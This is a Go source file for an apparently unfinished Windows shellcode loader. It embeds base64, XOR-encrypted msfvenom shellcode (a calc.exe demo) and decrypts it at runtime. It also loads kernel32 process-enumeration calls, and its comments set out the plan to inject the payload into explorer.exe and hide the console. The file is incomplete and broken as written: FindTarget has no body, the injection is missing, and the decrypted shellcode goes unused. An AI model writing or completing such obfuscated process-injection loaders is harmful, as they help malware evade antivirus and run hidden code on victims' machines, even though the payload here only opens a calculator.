package main

import (
	"fmt"
	"unsafe"
	_ "embed"
	b64 "encoding/base64"
	"golang.org/x/sys/windows"
)

var (
	kernel32DLL   = windows.NewLazySystemDLL("kernel32.dll")
	
	lstrcmpiA = kernel32DLL.NewProc("lstrcmpiA")
	CloseHandle = kernel32DLL.NewProc("CloseHandle")
	Process32Next  = kernel32DLL.NewProc("Process32Next")
	Process32First  = kernel32DLL.NewProc("Process32First")
	CreateToolhelp32Snapshot = kernel32DLL.NewProc("CreateToolhelp32Snapshot")

)

//go:embed sc.xor.42.b64
//msfvenom -p windows/x64/exec CMD='cmd.exe /c calc.exe' -f raw
// XOR Encrypted with '42'
var enc_sc_b64 string 

// https://kylewbanks.com/blog/xor-encryption-using-go
// xor runs a XOR encryption on the input string, encrypting it if it hasn't already been,
// and decrypting it if it has, using the key provided.
func xor(input, key string) (output []byte) {
	for i := 0; i < len(input); i++ {
			output = append(output, input[i] ^ key[i % len(key)])
	}

	return output
}

func decrypt_xor_shellcode(key string, encrypted_sc_b64 string)(output []byte){ 
	//Decode from b64 string
	enc_sc, _ := b64.StdEncoding.DecodeString(encrypted_sc_b64)
	//XOR with key
	output = xor(string(enc_sc), key)
	
	return output
	 
}

func FindTarget()
func main() {
	// objectives:
	// embed encrypted shellcode from file into program
	// decrypt shellcode (XOR)
	// inject shellcode into explorer.exe
	// get rid of console window (pop up)
	key := "42"
	sc := decrypt_xor_shellcode(key, enc_sc_b64)
	

	

}
